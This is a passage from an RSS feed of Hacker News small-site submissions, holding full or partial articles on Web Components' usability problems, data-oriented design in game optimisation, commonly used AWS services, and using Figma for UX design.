<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rdambrosio016.github.io/rust/2020/09/18/pure-ast-based-linting-sucks.html">https://rdambrosio016.github.io/rust/2020/09/18/pure-ast-based-linting-sucks.html</a></em></p>]]>
            </description>
            <link>https://rdambrosio016.github.io/rust/2020/09/18/pure-ast-based-linting-sucks.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24587543</guid>
            <pubDate>Fri, 25 Sep 2020 07:45:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The failed promise of Web Components]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24587413">thread link</a>) | @tannhaeuser
<br/>
September 25, 2020 | https://lea.verou.me/2020/09/the-failed-promise-of-web-components/ | <a href="https://web.archive.org/web/*/https://lea.verou.me/2020/09/the-failed-promise-of-web-components/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>Web Components had so much potential to empower HTML to do more, and make web development more accessible to non-programmers and easier for programmers. Remember how exciting it was every time we got new shiny HTML elements that actually <em>do stuff</em>? Remember how exciting it was to be able to do sliders, color pickers, dialogs, disclosure widgets straight in the HTML, without having to include any widget libraries?</p>



<p>The promise of Web Components was that we‚Äôd get this convenience, but for a much wider range of HTML elements, developed much faster, as nobody needs to wait for the full spec + implementation process. We‚Äôd just include a script, and boom, we have more elements at our disposal!</p>



<p>Or, that was the idea. Somewhere along the way, the space got flooded by JS frameworks aficionados, who revel in complex APIs, overengineered build processes and dependency graphs that look like the roots of a banyan tree.</p>



<figure><img src="https://live.staticflickr.com/2025/32441377780_e3acf6de12_b.jpg" alt=""><figcaption>This is what the roots of a Banyan tree look like. <a href="https://www.flickr.com/photos/79721788@N00/32441377780/">Photo by David Stanley on Flickr (CC-BY)</a>. </figcaption></figure>



<p>Perusing the components on <a href="https://www.webcomponents.org/">webcomponents.org</a> fills me with anxiety, and I‚Äôm perfectly comfortable writing JS ‚Äî I write JS for a living! What hope do those who can‚Äôt write JS have? Using a custom element from the directory often needs to be preceded by a ritual of npm flugelhorn, import clownshoes, build quux, all completely unapologetically because ‚Äúhere is my truckload of dependencies, yeah, what‚Äù. Many steps are even omitted, likely because they are ‚Äúobvious‚Äù. Often, you wade through the maze only to find the component doesn‚Äôt work anymore, or is not fit for your purpose.</p>



<p>Besides setup, the main problem is that HTML is not treated with the appropriate respect in the design of these components. They are not designed as closely as possible to standard HTML elements, but <em>expect</em> JS to be written for them to do anything. HTML is simply treated as a shorthand, or worse, as merely a marker to indicate where the element goes in the DOM, with all parameters passed in via JS. I recall <a href="https://adactio.com/articles/12839#webcomponents">a wonderful talk by Jeremy Keith</a> a few years ago about this very phenomenon, where he discussed <a href="https://shop.polymer-project.org/">this e-shop Web components demo by Google</a>, which is the poster child of this practice. These are the entire contents of its <code>&lt;body&gt;</code> element:</p>



<pre><code>&lt;body&gt;
	&lt;shop-app unresolved=""&gt;SHOP&lt;/shop-app&gt;
	&lt;script src="node_assets/@webcomponents/webcomponentsjs/webcomponents-loader.js"&gt;&lt;/script&gt;
	&lt;script type="module" src="src/shop-app.js"&gt;&lt;/script&gt;
	&lt;script&gt;window.performance&amp;&amp;performance.mark&amp;&amp;performance.mark("index.html");&lt;/script&gt;
&lt;/body&gt;</code></pre>



<p>If this is how Google is leading the way, how can we hope for contributors to design components that follow established HTML conventions?</p>



<p>Jeremy criticized this practice from the aspect of backwards compatibility: when JS is broken or not enabled, or the browser doesn‚Äôt support Web Components, the entire website is blank. While this is indeed a serious concern, my primary concern is one of <strong>usability</strong>: <strong>HTML is a lower barrier to entry language</strong>. Far more people can write HTML than JS. Even for those who do eventually write JS, it often comes after spending years writing HTML &amp; CSS.</p>



<p>If components are designed in a way that requires  JS, this excludes thousands of people from using them. And even for those who <em>can</em> write JS, HTML is often easier: you don‚Äôt see many people rolling their own sliders or using JS-based ones once <code>&lt;input type="range"&gt;</code> became widely supported, right?</p>



<p>Even when JS is unavoidable, it‚Äôs not black and white. A well designed HTML element can reduce the amount and complexity of JS needed to a minimum. Think of the <code><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dialog">&lt;dialog&gt;</a></code> element: it usually does require *some* JS, but it‚Äôs usually rather simple JS. Similarly, the <code>&lt;video&gt;</code> element is perfectly usable just by writing HTML, and has a comprehensive JS API for anyone who wants to do fancy custom things.</p>



<p>The other day I was looking for a simple, dependency free, tabs component. You know, the canonical example of something that is easy to do with Web Components, the example 50% of tutorials mention. I didn‚Äôt even care what it looked like, it was for a testing interface. I just wanted something that is small and works like a normal HTML element. Yet, it proved so hard I ended up writing my own!</p>



<h3>Can we fix this?</h3>



<p>I‚Äôm not sure if this is a design issue, or a documentation issue. Perhaps for many of these web components, there are easier ways to use them. Perhaps there are vanilla web components out there that I just can‚Äôt find. Perhaps I‚Äôm looking in the wrong place and there is another directory somewhere with different goals and a different target audience. </p>



<p>But if not, and if I‚Äôm not alone in feeling this way, we need a directory of web components with strict inclusion criteria:</p>



<ul><li><strong>Plug and play.</strong> No dependencies, no setup beyond including one <code>&lt;script&gt;</code> tag. If a dependency is absolutely <em>needed</em> (e.g. in a map component it doesn‚Äôt make sense to draw your own maps), the component loads it automatically if it‚Äôs not already loaded.</li><li>Syntax and API follows <a href="https://www.smashingmagazine.com/2017/02/designing-html-apis/"><strong>conventions established by built-in HTML elements</strong></a> and anything that <em>can</em> be done without the component user writing JS, <em>is</em> doable without JS, per <a href="https://www.w3.org/2001/tag/doc/leastPower.html">the W3C principle of least power</a>.</li><li><strong>Accessible by default</strong> via sensible ARIA defaults, just like normal HTML elements.</li><li><strong>Themable</strong> via <code><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/::part">::part()</a></code>, selective inheritance and custom properties. Very minimal style by default. Normal CSS properties should just ‚Äúwork‚Äù to the the extent possible.</li><li><strong>Only one component of a given type</strong> in the directory, that is <strong>flexible</strong> and <strong>extensible</strong> and continuously iterated on and improved by the community. Not 30 different sliders and 15 different tabs that users have to wade through. No branding, no silos of ‚Äúcomponent libraries‚Äù. Only elements that are designed as closely as possible to what a browser would implement in every way the current technology allows.</li></ul>



<p>I would be up for working on this if others feel the same way, since that is not a project for one person to tackle. <em>Who‚Äôs with me?</em></p>

		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://lea.verou.me/2020/09/the-failed-promise-of-web-components/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24587413</guid>
            <pubDate>Fri, 25 Sep 2020 07:24:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data oriented design is not about SoA and ECS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24587394">thread link</a>) | @meheleventyone
<br/>
September 25, 2020 | https://www.polymonster.co.uk/blog/dod-ecs | <a href="https://web.archive.org/web/*/https://www.polymonster.co.uk/blog/dod-ecs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">

		<div data-page-title="Data oriented design is not about SoA and ECS ‚Äì Alex Dixon" data-image="">

			<section>

	

</section>

<section>

	<div>

		<p>There has been a lot of discussion coming to my attention recently regarding data oriented design (DOD) or data oriented architecture (DOA). It is something very close to my heart because I love optimisation; I have to do it for all the products I work on as a software engineer and so I am always thinking about the data first. Being data oriented is thinking about the data you have and the transformations you need to make, to get the output you desire on the hardware you are targeting.</p>

<p>When it comes to DOD a lot of the discussion (sometimes the only discussion) is about entity component systems (ECS) using structure of arrays (SoA) to improve cache utilisation. Every man and his dog now knows about ‚ÄúThe Cache‚Äù and I hear them throw around the term ‚ÄúCache Coherency‚Äù incorrectly (when it actually describes a <a href="https://bit.ly/2HkUR4S">different problem</a> present in CPU architectures). I have worked with a number coders who continually try bringing cache efficiency optimisation into discussion at the wrong place and the wrong time, having never actually applied any DOD themselves. This is very frustrating because it is not something that has a one size fits all solution, they just picked up a few buzzwords thinking they know it all and some people have spent many, many sleepless nights grinding out those final CPU cycles to hit a target frame rate.</p>

<p>My interest in DOD all started when I was optimising CPU code for PS3 and Xbox360 games, I was deep in crunch and trying to grind out a 60hz fixed timestep update on a single PowerPC Unit (PPU) where having to shave off even a few milliseconds became increasingly difficult. We had PC ports of the projects which ran smooth as butter and there was a time I did not know the inherent differences in CPU architectures of PPU vs x86/64. But then I found great talks and blog posts from other devs explaining what was happening and how DOD was a way to solve the issues. This <a href="https://www.youtube.com/watch?v=rX0ItVEVjHc">talk</a> from Mike Acton was the canonical one of the time.</p>

<p>The PPU that I was optimising for was only capable of in-order execution or incapable of out-of-order (OoO) execution. This meant that CPU stalls while waiting for L2 cache-misses were one of the biggest penalties you were likely to see (~600 CPU cycles). The profiling tools for various platforms made this abundantly clear by highlighting cache-misses, but if you didn‚Äôt know about the problem of in-order execution and tried to optimise code at the instruction level, it would make little difference. The performance cost here was not as a result of the PPU doing too much work that needed reducing, it was because the PPU would be idle while waiting for data and unable to process anything else. CPU stalls can occur for a number of reasons; we may be reading from disk, we may miss the instruction cache or data cache, and even at the instruction level we have to wait some amount of CPU cycles for the result to complete. DOD helped to minimise the stalls and maximise data throughput. Compilers schedule operations to hide instruction latency, loop unrolling is an example of this and is effective because we can issue and interleave operations while we wait for latency in the pipeline. Modern, more advanced CPU‚Äôs can do more effective things with OoO hiding even greater latencies.</p>

<p>CPU pipelines these days are typically much more complex than the older PPU‚Äôs so the same techniques which worked on a PS3 might not be applicable or necessary today. PPU had costly penalties for branching, especially when SIMD was involved you could perform additional redundant ALU operations, which got masked out instead of taking a branch. These branch evasion strategies were also crucial in shader code on GPU‚Äôs of the same era. Modern x86 CPU‚Äôs have good branch predictors and I have found that taking a branch can be more efficient than doing more ALU and masking a result, but again it all depends on the hardware and what you are trying to do.</p>

<p>DOD doesn‚Äôt have to be (and shouldn‚Äôt be) all about SoA like some people seem to think. My first optimisations with my new found insights were quick and dirty because we were at the end of a development cycle. I made changes which split out transforms and matrices into linear arrays from the ~400 byte monolithic <code>GameObject</code> base class and generated matrices from transforms, did hierarchical matrix multiplications, and performed frustum culling on a more cache efficient set of data. I also generated a list of active physics objects to lookup and update only active objects, instead of dereferencing a polymorphic object and drilling through a call stack only to early out when the object was inactive. This list was updated each frame as a byproduct of another update operation so was almost for free. These were simple optimisations that improved data cache utilisation, but also just reduced general overhead of calling functions and pointer chasing. They were by no means the most efficient solution, but they were certainly way more efficient than the previous implementation and they helped to ship a game with a fixed timestep at 60hz for every level of the game.</p>

<p>There are a lot of things that I consider to be data oriented optimisations. Loading binary files that have been prepared offline into a runtime ready layout so they can just be loaded straight into RAM with no unpacking or computational work is data oriented. Preparing textures that are already in a tiled GPU specific memory layout so it can just go straight into GPU would be an example of this, however if you have a large amount of data, and a platform with small storage, you may need to use precious CPU cycles to perform work to uncompress it so that it can fit onto flash storage, this is also DOD. You need to fit your data into the constraints of the hardware, runtime performance is not the only goal, memory usage might be a limitation, bandwidth might be an issue‚Ä¶ and so on.</p>

<p>The last game I shipped is a live action (FMV) game with a huge amount of video data. The video data needs to be streamed from the internet, buffered onto HDD, loaded into RAM, and decoded on the GPU. We can playback videos and take many different storyline branches with video frames ready to render at literally zero latency because of prefetching, buffering and some lockless CPU/GPU synchronisation. The tools and build processes to manipulate data into forms that make it possible to achieve these goals are also data oriented. It isn‚Äôt just the runtime; from the initial conception and authoring of content until it is transmitted into a consumers eye balls is just one big long data oriented process.</p>

<p>Flippantly people say ‚Äúwe have larger CPU caches and clever branch predictors now‚Ä¶ we don‚Äôt need DOD anymore‚Äù, do not discount the number of memory or performance limited embedded systems around, and in use today. Do not underestimate the difference a few microseconds saving inside a hot loop can save money (cloud services) or increase revenue (trading systems). Until you have a concrete application you cannot begin real data oriented design‚Ä¶ The real process begins when you understand your architecture, profile your code, measure the results and find out what works best in that scenario, be it performance, data size or whatever else you may need to achieve.</p>

<p>Having said all of this, I do have my own game engine which has a SoA ECS, I will write a post about this, the history behind it and some of the decisions I made, if anyone cares to listen.</p>

<p>At the end of the day DOD is just all about the data. The king is the data, long live the data.</p>



	</div>

</section>

		</div>

	</div></div>]]>
            </description>
            <link>https://www.polymonster.co.uk/blog/dod-ecs</link>
            <guid isPermaLink="false">hacker-news-small-sites-24587394</guid>
            <pubDate>Fri, 25 Sep 2020 07:21:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Most Commonly Used AWS Services and How We Are Using Them]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24587218">thread link</a>) | @sunilkumarc
<br/>
September 24, 2020 | https://sunilkumarc.in/most-commonly-used-aws-services-and-how-we-are-using-them?guid=abbe7ff8-14af-4d94-beb6-6a9da8bb0f64&deviceId=b6a7ad08-1190-46b0-87e6-716c034f4274 | <a href="https://web.archive.org/web/*/https://sunilkumarc.in/most-commonly-used-aws-services-and-how-we-are-using-them?guid=abbe7ff8-14af-4d94-beb6-6a9da8bb0f64&deviceId=b6a7ad08-1190-46b0-87e6-716c034f4274">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>I work as a senior software developer at a startup. We mainly provide APIs to integrate voice and sms services into applications. So naturally our complete infrastructure is on a cloud provider, which in our case is AWS. </p>
<p>For someone who has not worked on managing infrastructure on cloud, it can be very difficult to understand different components involved in building scalable applications. For me personally, I didn't know anything about AWS concepts before I started woking here. In the last 2.5 years I've learnt so much on AWS and knowing the importance of learning these concepts, I decided to write a series of articles for people who want to get started with AWS or any other cloud services provider in general. This is the first article in the series.</p>
<p>AWS is one of the market leaders who provides cloud computing services and powers the applications behind companies like Facebook, Netflix, LinkedIn, NASA etc.</p>
<p>As a software developer it's important to know about different cloud computing services which are needed to build distributed, highly scalable applications. If you've not worked on infrastructure yet, you'll definitely get to work on it in your development career at some point. In this article I'll cover some of the important services we use from AWS.</p>
<p>AWS provides numerous services but below are the commonly used ones:</p>
<ul>
<li><a href="#ec2">Elastic Compute Cloud (EC2)</a></li>
<li><a href="#rds">Relational Database Service (RDS)</a></li>
<li><a href="#ecs">Elastic Container Service (ECS)</a></li>
<li><a href="#elasticache">ElastiCache</a></li>
<li><a href="#s3">Simple Storage Service (S3)</a></li>
<li><a href="#sqs">Simple Queuing Service (SQS)</a></li>
<li><a href="#load-balancer">Load Balancer</a></li>
<li><a href="#route53">Route 53</a></li>
<li><a href="#lambda">AWS Lambda</a></li>
<li><a href="#vpc">Amazon Virtual Private Cloud (VPC)</a></li>
</ul>
<h3 id="lessa-idec2greaterlessagreater-1-elastic-compute-cloud-ec2"><a id="ec2"></a> 1. Elastic Compute Cloud (EC2):</h3>
<p>EC2 instances are basically servers with an operating system which can be used to run your applications on the internet just like you run your applications on your laptop during development.</p>
<p>EC2 machines come with different configurations for CPU, Memory, Ram etc. They are categorised based on their computing power, memory optimisation, storage optimisation etc. For example all the memory optimised instances belong to <strong>m</strong> family. All the compute optimised instances belong to <strong>c</strong> family etc.</p>
<p>You can use these instances to run backend servers, background scripts, database servers, front end applications etc.</p>
<p>Since we have many micro services for powering our APIs, we use these instances along with Elastic Container Service (container orchestration service) to deploy our docker containers. We even use standalone EC2 instances as jumpbox hosts for running any ad-hoc scripts to perform tasks like backfill data, connect to private database, redis cache etc.</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/d4jelj93xx9gocwqvtn9.jpeg" alt="ec2_image"></p>
<h3 id="lessa-idrdsgreaterlessagreater-2-relational-database-service-rds"><a id="rds"></a> 2. Relational Database Service (RDS):</h3>
<p>RDS is a distributed relational database service.</p>
<p>Amazon RDS is available on several database instance types - optimised for memory, performance or I/O - and provides six familiar database engines to choose from, including Amazon Aurora, PostgreSQL, MySQL, MariaDB, Oracle Database, and SQL Server.</p>
<p>Amazon RDS allows your to create read replicas in the same region or on a different region. You can create one or more replicas of a given source DB Instance and serve high-volume application read traffic from multiple copies of your data, thereby increasing aggregate read throughput.Read replicas can also be promoted when needed to become standalone DB instances.</p>
<p>We use PostgreSQL for all of our main databases and RedShift to keep the data needed for analytics and reporting. There's one central database where the common data is stored and separate databases where data related to different products owned by respective teams are stored.</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/q7kxr8vn4pwxvwte8bc5.png" alt="Screen Shot 2020-09-23 at 10.40.27 PM"></p>
<h3 id="lessa-idecsgreaterlessagreater-3-elastic-container-service-ecs"><a id="ecs"></a> 3. Elastic Container Service (ECS):</h3>
<p>AWS ECS is a fully managed container orchestration service.</p>
<p>ECS has been a foundational pillar for key Amazon services and it can natively integrate with other services such as Amazon Route 53, Secrets Manager, AWS Identity and Access Management (IAM), and Amazon CloudWatch providing you a familiar experience to deploy and scale your containers.</p>
<p>You can add auto scaling to your ECS clusters to scale up or scale down the number of instances and tasks depending on your traffic needs. When your services are getting high traffic you can increase the number of cluster instances and service tasks. Similarly you can decrease them when the traffic is less. For example you can keep a desired count of 4 containers for a particular service. Using auto scaling you can setup rules like if the CPU % goes beyond 80%, add 2 more containers. If CPU % goes below 40%, remove 2 containers.</p>
<p>Within our organisation each team has their own ECS cluster and each cluster has micro service containers owned by them. We scale individual service independently depending on the traffic.</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/ina4ojrdmfcizwosqgx8.png" alt="product-page-diagram_ECS_1.86ebd8c223ec8b55aa1903c423fbe4e672f3daf7"></p>
<h3 id="lessa-idelasticachegreaterlessagreater-4-elasticache"><a id="elasticache"></a> 4. ElastiCache:</h3>
<p>Amazon ElastiCache works as a high throughput and low latency in-memory data store and cache to support the most demanding applications requiring sub-millisecond response times.</p>
<p>Amazon ElastiCache is a popular choice for real-time use cases like Caching, Session Stores, Gaming, Geospatial Services, Real-Time Analytics, and Queuing.</p>
<p>Amazon ElastiCache offers fully managed Redis and Memcached for your most demanding applications that require sub-millisecond response times.</p>
<p>Similar to EC2 instance types, there are multiple instance families and types available like t3, r5, m5 etc. You can use the one which you need based on your computing requirements and budget constraints.</p>
<p>In our organisation, we have a service which gets around 6000 reqs/sec and we needed low API response time from this service. So we decided use ElastiCache as the primary source of data for this micro service. The service has been able to serve requests with single digit millisecond response time without any issues.</p>
<p>Apart from this we use Redis in many other critical services as write-through, write-back cache and also to store some data which can be accessed quickly.</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/n0s5ovl9mgidg9a96xd8.png" alt="elasticache"></p>
<h3 id="lessa-ids3greaterlessagreater-5-simple-storage-service-s3"><a id="s3"></a> 5. Simple Storage Service (S3):</h3>
<p>As the name suggests S3 provides low cost object storage service with high scalability, data availability, security and performance.</p>
<p>S3 can be used to store files for many use cases like websites, mobile apps, enterprise applications, backup and restore etc.</p>
<p>Amazon S3 is designed for 99.999999999% (11 9's) of durability, and stores data for millions of applications for companies all around the world.</p>
<p>We use S3 in various use cases like to store call recordings, invoice pdf files, payment receipts, backup older service logs, Amazon Athena to query data stored in S3 for analytics etc. We even use it for lambda trigger events.</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/mdzls6579so4u2b9p4jm.jpg" alt="Diagram_S3_Access_Points.fa88c474dc1073aede962aaf3a6af2d6b02be933"></p>
<h3 id="lessa-idsqsgreaterlessagreater-6-simple-queuing-service-sqs"><a id="sqs"></a> 6. Simple Queuing Service (SQS):</h3>
<p>SQS is a fully managed message queuing service that enables you to decouple and scale micro services independently. Using SQS you can send, store and receive messages between different components at any volume. This helps you to build highly scalable and distributed applications.</p>
<p>SQS offers two types of message queues:</p>
<ul>
<li><p>Standard queues: Standard SQS should be used when you've requirements for maximum throughput, no ordering and at-least-once delivery of messages is needed.</p>
</li>
<li><p>FIFO queues: FIFO SQS should be used when order of the messages is important and they should be processed exactly once, in the same order they are sent.</p>
</li>
</ul>
<p>The two important properties of SQS queues are message retention period and default visibility timeout. </p>
<p><strong>Message Retention Period:</strong> is the time for which any message pushed into the queue is retained. For example if this value is 3 days, messages will be deleted after 3 days from the queue.</p>
<p><strong>Default Visibility Timeout:</strong> once any worker / application has picks up a message, the default visibility timeout is the time only after which the message will be visible again for other workers to pick it up and process.</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/o1herbvj4yhv8u7pfjy9.png" alt="Diagram2"></p>
<h3 id="lessa-idload-balancergreaterlessagreater-7-load-balancer"><a id="load-balancer"></a> 7. Load Balancer:</h3>
<p>Load Balancer is a critical component of any distributed system which sits between a client and a server, accepts incoming requests, and routes them across a a cluster of servers to handle the load.</p>
<p>It keeps track of health status of all the servers connected. If a particular server is unhealthy, then it will not send incoming requests to that server.</p>
<p>Benefits of a load balancer:</p>
<ul>
<li>Faster user experience</li>
<li>Less downtime and high throughput. If a particular server is down, LB takes care of routing the traffic to the ones which are up.</li>
<li>Reduces individual server load and prevents any one application server from becoming a single point of failure.</li>
<li>Improves response time </li>
<li>Improves overall system availability</li>
</ul>
<p>Routing algorithms used:</p>
<ul>
<li>Least Connection Method</li>
<li>Least Response Time Method</li>
<li>Least Bandwidth Method</li>
<li>Round Robin Method</li>
<li>Weighted Round Robin Method</li>
<li>IP Hash Method</li>
</ul>
<p>We use both internet facing and internal load balancers in our services depending on whether it's a customer facing application or an internal micro service.</p>
<p>There are many other concepts that are tightly coupled with Load Balancers like:</p>
<ul>
<li>Target Groups</li>
<li>Listener Rules</li>
</ul>
<p>These are not in the scope of this article. But I highly recommend reading about these.</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/lpypr06mji7dnjg07gqz.png" alt="alb"></p>
<h3 id="lessa-idroute53greaterlessagreater-8-route-53"><a id="route53"></a> 8. Route 53:</h3>
<p>Route53 a highly available and scalable DNS service from AWS. If you don't know what a DNS service is, it's basically the service which routes end users to Internet applications by translating names like <a href="http://www.example.com/" target="_blank">example.com</a> into the numeric IP addresses like 192.0.2.1 that computers use to connect to each other.</p>
<p>Route53 allows us to route traffic through a variety of routing types like Simple Routing, Weighted Round Robin, Latency Routing, Failover Routing, Multi Answer Routing, Geolocation etc. With different combinations of these we can build highly available fault tolerant systems.</p>
<p>There are different types of DNS records available depending on how you want to route based on DNS queries:</p>
<ul>
<li>A record type</li>
<li>AAAA record type</li>
<li>CAA record type</li>
<li>CNAME record type</li>
<li>MX record type</li>
<li>NAPTR record type</li>
<li>NS record type</li>
<li>PTR record type</li>
<li>SOA record type</li>
<li>SPF record type</li>
<li>SRV record type</li>
<li>TXT record type</li>
</ul>
<p>We use route53 in various use cases within our organisation to:</p>
<ul>
<li>Route traffic from a host endpoint to an internal load balancer using CNAME record</li>
<li>Route traffic from a host endpoint to a ‚Ä¶</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sunilkumarc.in/most-commonly-used-aws-services-and-how-we-are-using-them?guid=abbe7ff8-14af-4d94-beb6-6a9da8bb0f64&amp;deviceId=b6a7ad08-1190-46b0-87e6-716c034f4274">https://sunilkumarc.in/most-commonly-used-aws-services-and-how-we-are-using-them?guid=abbe7ff8-14af-4d94-beb6-6a9da8bb0f64&amp;deviceId=b6a7ad08-1190-46b0-87e6-716c034f4274</a></em></p>]]>
            </description>
            <link>https://sunilkumarc.in/most-commonly-used-aws-services-and-how-we-are-using-them?guid=abbe7ff8-14af-4d94-beb6-6a9da8bb0f64&amp;deviceId=b6a7ad08-1190-46b0-87e6-716c034f4274</link>
            <guid isPermaLink="false">hacker-news-small-sites-24587218</guid>
            <pubDate>Fri, 25 Sep 2020 06:52:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Figma for User Experience Design]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24587183">thread link</a>) | @xxlcloudinc
<br/>
September 24, 2020 | https://codecoda.com/en/blog/entry/using-figma-for-user-experience-design | <a href="https://web.archive.org/web/*/https://codecoda.com/en/blog/entry/using-figma-for-user-experience-design">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="description">
<p>UI/UX is quite a common term in the design industry. However, many designers fall under the UI path, focusing exclusively on interfaces, layouts, and the websites or apps overall visuals.</p>
<div><p>User Experience focuses more on user interactions, whether the platform is an app, a website, or another product. Excellent user experience emphasizes the deep understanding users have when browsing their values, limitations, and abilities. The best UX practices promote improving user interactions with the perception of the product. Moreover, as of recently, UX is quickly also becoming <strong><a href="https://codecoda.com/en/blog/entry/ux-with-a-big-role-in-google-ranking">one of SEO‚Äôs most critical factors</a>.</strong></p><p>There are hardly any better ways to create smooth, helpful, and enjoyable experiences than the one featuring one of the best UX prototyping tools in the market ‚Äì Figma.</p></div>
<video width="100%" height="100%" autoplay="" muted="true" loop="" eq-attached="true" playsinline=""><source src="https://cdn.codecoda.com/video/using-figma-for-ux.mp4" type="video/mp4">
</video>
<h2>What makes a great User Experience?‚ÄØ</h2>
<p>There is no right answer to what makes a great user experience as it depends entirely on user interactions and perceptions of the product. Every UX is particular to the user groups and user needs. The expertise of Figma alone, despite its robust features, will not give you an excellent user experience. Instead, an application of UX processes ‚Äì a series of actions for every UX designer to take into consideration while developing user experience ‚Äì and knowledge of Figma will set you on the path to creating extraordinary user experience design. These processes include (in no particular order): </p>
<ul>
<li>Creating <a href="https://codecoda.com/en/blog/entry/the-benefits-of-user-personas-when-designing-the-ultimate-user-experience"><strong>user-profiles and personas</strong></a></li>
<li>User survey</li>
<li>Interface testing</li>
<li>Mockups</li>
<li>Wireframes</li>
<li>UX flow</li>
<li>Prototyping‚ÄØtools</li>
<li>Sitemaps</li>
<li>Design patterns</li>
<li>Style guides</li>
</ul>
<h2>Why Figma?</h2>
<div><p>Figma is a free (for individuals), cloud-based, vector-based, prototyping tool quite similar to Sketch in functionality. It stands out because of its flexible features, accessibility, designer-developer collaborations, pricing, and prototyping qualities.</p><p>Figma gives designers access, not just in cutting edge features, but in practical execution. Being browser-based, it eliminates the drawbacks of having to work with a particular OS or PC. There is no question of Figma for Linux, Figma for mac, or Figma for windows. As long as you have a browser, you can work with it. Its real-time frictionless collaboration between developers and designers has proved to be instrumental for cohesive and reliable design systems.</p></div>
<h2>Can beginners use Figma?</h2>
<p>Yes. Figma is relatively easy to learn and takes very little time to get up to speed with how it operates. Not just for newbies but also designers who migrate from other prototyping tools. Figma has almost every element you need on the same page. The icons are relatable and easy to identify. The features are interactive, and the design page - simple.</p>
<h3>Figma‚Äôs key features include:</h3>
<ul>
<li>Open Type fonts</li>
<li>Plugins that support automated tasks for repeated actions</li>
<li>Smart-selection tools</li>
<li>Styles that can immediately be applied to your project</li>
<li>Create design systems and components</li>
<li>Drag and drop accessible libraries</li>
<li>An unlimited number of collaborators at a given time</li>
<li>User permissions control</li>
<li>Live link easy-export</li>
<li>Prototype tools, optimized for mobile</li>
<li>Intuitive animation that connects objects</li>
<li>Embedded comments</li>
<li>Real-time editing with teams in shared design spaces</li>
<li>Version history tracked to see what was changed, who made the edit, and when.</li>
<li>Design systems where assets are searchable</li>
<li>Custom styles can be shared (all files are in one location)</li>
<li>Components reuse</li>
<li>One platform to design, prototype, and build</li>
</ul>
<h2>The Power of Figma as an excellent User Experience Design Tool</h2>
<div><p>Before Figma, wireframing, design, prototyping, and collaboration was a series of iterative back and forth process between the vector-based prototyping tool and other third-party apps. One would have to build wireframes in an app like Balsamiq, create the design in <strong>Sketch</strong>, then prototype in <strong>inVision</strong>. <em>Figma got rid of the extra baggage</em> by creating a platform where everything, from wireframes to prototypes, can be done on one screen.</p><p>Figma incorporates powerful features that simplify the UX creation process for designers and makes it more effective at helping designers and adjacent teams work together. Let‚Äôs take a closer look.‚ÄØ </p></div>
<h3>1. Components</h3>
<div><p>Components are reusable, scalable elements in the design. They are very flexible, easy to use, and help create consistent designs across multiple projects.</p><p>By allowing designers to create UI libraries‚Äîand share them with the team‚Äîanyone with access to a project can use component instances in <em>their</em> designs and rest assured that they work with the latest version.</p><p>To create a component, select the object you want to create a component in, right-click, and select ‚ÄòCreate Component.‚Äô</p></div>
<figure><img src="https://cdn.codecoda.com/img/pixel.gif" data-plugin-lazyload="" data-plugin-options="{'effect' : 'fadeIn', 'speed' : 'fast'}" data-original="https://cdn.codecoda.com/themes/user/site/default/asset/img/blog/figma-components.jpg" alt="Figma - Working with components">
<figcaption><small>Figma - Working with components</small></figcaption>
</figure>
<p>The beauty of Figma‚Äôs component structure is that it has a nice layer hierarchy set in place. The master components can be edited in their respective layers, inside the particular element, keeping everything organized and situated conveniently on the same page.‚ÄØ </p>
<h3>2. Wireframes</h3>
<p>Wireframes are visual guides representing webpages‚Äô skeletal framework and provide a preview of a site or app‚Äôs feel and look. Creating wireframes is usually the first step in the UX process. Wireframes are the blueprints of the final design. Figma‚Äôs wireframing makes working with designs feel approachable and intuitive. They offer wireframe templates and wireframe kits live in the browser to begin sketching without the need for any additional software. By harnessing Figma prototyping‚Äôs power, you can also bring your wireframes to life without having to code.</p>
<figure><img src="https://cdn.codecoda.com/img/pixel.gif" data-plugin-lazyload="" data-plugin-options="{'effect' : 'fadeIn', 'speed' : 'fast'}" data-original="https://cdn.codecoda.com/themes/user/site/default/asset/img/blog/figma-wireframes.jpg" alt="Figma - Wireframes">
<figcaption><small>Figma - Wireframes</small></figcaption>
</figure>
<p>Figma supports both low fidelity and high fidelity wireframing. Their templates are easy to share, and your team can leave comments right on the file. By using Figma‚Äôs wireframe, you will:</p>
<ul>
<li>Cut back on revisions</li>
<li>Get instant feedback</li>
<li>Decide the content priority</li>
<li>Test usability</li>
<li>Catch problems early</li>
<li>Get stakeholders to see what the product will look like</li>
</ul>
<h3>3. Third-party developer APIs</h3>
